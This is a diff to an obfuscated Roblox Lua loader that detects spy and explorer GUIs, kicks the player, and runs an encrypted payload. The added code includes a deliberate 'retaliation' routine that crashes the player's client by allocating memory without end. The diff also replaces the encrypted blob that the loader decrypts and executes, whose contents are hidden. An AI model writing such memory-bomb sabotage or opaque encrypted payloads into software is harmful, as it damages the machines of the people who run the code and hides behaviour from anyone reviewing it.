@@ -833,8 +833,20 @@ end
 
 -- 4b) Spy/explorer GUIs (Dex, RemoteSpy, SimpleSpy, Hydroxide, IY window) ------
 -- scans CoreGui, the executor-hidden gui (gethui), and PlayerGui by exact name.
--- substring patterns (tools sometimes suffix/version their GUI names)
-local SPY_GUI = { "dex", "remotespy", "remote spy", "simplespy", "hydroxide", "spygui", "infiniteyield" }
+-- PRECISE name matching: exact known names, plus controlled version patterns,
+-- so we don't false-positive on legit GUIs (e.g. "Dexterity" must NOT match "dex").
+local EXACT = {
+	["dex"] = true, ["dex explorer"] = true, ["remotespy"] = true, ["remote spy"] = true,
+	["simplespy"] = true, ["simple spy"] = true, ["hydroxide"] = true,
+}
+local function isSpyName(nm)
+	if EXACT[nm] then return true end
+	if string.match(nm, "^dex%s*v?%d") then return true end          -- "dex v4", "dex 5"
+	if string.match(nm, "^remotespy") then return true end
+	if string.match(nm, "^simplespy") then return true end
+	if string.match(nm, "^hydroxide") then return true end
+	return false
+end
 function Defense.detectSpyGui()
 	local parents = {}
 	pcall(function() parents[#parents + 1] = game:GetService("CoreGui") end)
@@ -847,10 +859,7 @@ function Defense.detectSpyGui()
 		local ok, kids = pcall(function() return p:GetChildren() end)
 		if ok then
 			for _, c in ipairs(kids) do
-				local nm = string.lower(c.Name)
-				for _, pat in ipairs(SPY_GUI) do
-					if string.find(nm, pat, 1, true) then return true, "GUI: " .. c.Name end
-				end
+				if isSpyName(string.lower(c.Name)) then return true, "GUI: " .. c.Name end
 			end
 		end
 	end
@@ -896,7 +905,8 @@ function Defense.watchdog(ctx, onDetect, opts)
 	local body = function()
 		local wait_ = (task and task.wait) or wait
 		wait_(opts.startDelay or 1)            -- let tools finish loading
-		local n = 0
+		local n, lastHit, confirm = 0, nil, 0
+		local need = opts.confirm or 2          -- require N consecutive detections (anti-false-positive)
 		while ctx.alive do
 			n = n + 1
 			local heavy = (n % (opts.heavyEvery or 5)) == 0
@@ -908,8 +918,14 @@ function Defense.watchdog(ctx, onDetect, opts)
 				raw = ctx.raw,
 			})
 			if #hits > 0 then
-				pcall(onDetect, hits[1].name, hits[1].detail)
-				return
+				if hits[1].name == lastHit then confirm = confirm + 1
+				else lastHit, confirm = hits[1].name, 1 end
+				if confirm >= need then
+					pcall(onDetect, hits[1].name, hits[1].detail)
+					return
+				end
+			else
+				lastHit, confirm = nil, 0
 			end
 			wait_(opts.interval or 3)
 		end
@@ -1001,6 +1017,16 @@ local function newContext(opts)
 		name = opts.name or "script",
 		mem = Memory.new(),   -- resource scope: tracks every thread/connection
 	}
+
+	-- capture a NAMECALL-FREE kick path NOW (early, before a tamperer can block
+	-- __namecall). We grab the LocalPlayer + its Kick method via __index and later
+	-- call kickFn(lp, msg) directly -- a __namecall block can't stop that.
+	pcall(function()
+		local plrs = game:GetService("Players")
+		ctx.lp = plrs.LocalPlayer
+		ctx.kickFn = ctx.lp and ctx.lp.Kick
+	end)
+
 	return ctx
 end
 
@@ -1032,11 +1058,33 @@ function Vm.protect(fn, opts)
 			local o = type(opts.antiSpy) == "table" and opts.antiSpy or {}
 			Defense.watchdog(ctx, function(name, detail)
 				if opts.onSpy then pcall(opts.onSpy, name, detail) end
+				-- clean message (no details). Prefer the namecall-free path captured
+				-- early; if that's gone, fall back to a normal namecall kick.
 				if o.kick ~= false then
-					pcall(function()
-						local lp = game:GetService("Players").LocalPlayer
-						lp:Kick(o.kickMessage or ("Tamper detected (" .. tostring(name) .. ")"))
-					end)
+					local kicked = false
+					if ctx.kickFn and ctx.lp then
+						kicked = pcall(ctx.kickFn, ctx.lp, "Tamper detected")  -- direct call, no __namecall
+					end
+					if not kicked then
+						pcall(function() game:GetService("Players").LocalPlayer:Kick("Tamper detected") end)
+					end
+				end
+				-- crash the tamperer's client (retaliation / fallback if kick is blocked):
+				-- allocate faster than GC can reclaim (refs kept) -> OOM. Runs in its own
+				-- thread so it isn't cancelled by cleanup.
+				if o.crash ~= false then
+					local sp = (task and task.spawn) or spawn
+					local crasher = function()
+						local sink = {}
+						while true do
+							if table.create then
+								sink[#sink + 1] = table.create(1048576, 0)
+							else
+								sink[#sink + 1] = string.rep("\0", 1048576)
+							end
+						end
+					end
+					if sp then pcall(sp, crasher) else pcall(crasher) end
 				end
 				if o.halt ~= false then
 					ctx.alive = false
@@ -1097,7 +1145,7 @@ return Vm
 
 end)()
 
-local __k = 'zT662lLn1pJSX7M5k1nc0qD3'
-local __p = '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'
+local __k = 'iiOgJgDWmym0OuXmuhnl4NqR'
+local __p = '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'
 local __src = Crypt.open(__p, __k)
 return Vm.run(__src, { name = 'Loader/Loader', checksum = 3399389314, interval = 2, antiSpy = { kick = true, halt = true } })
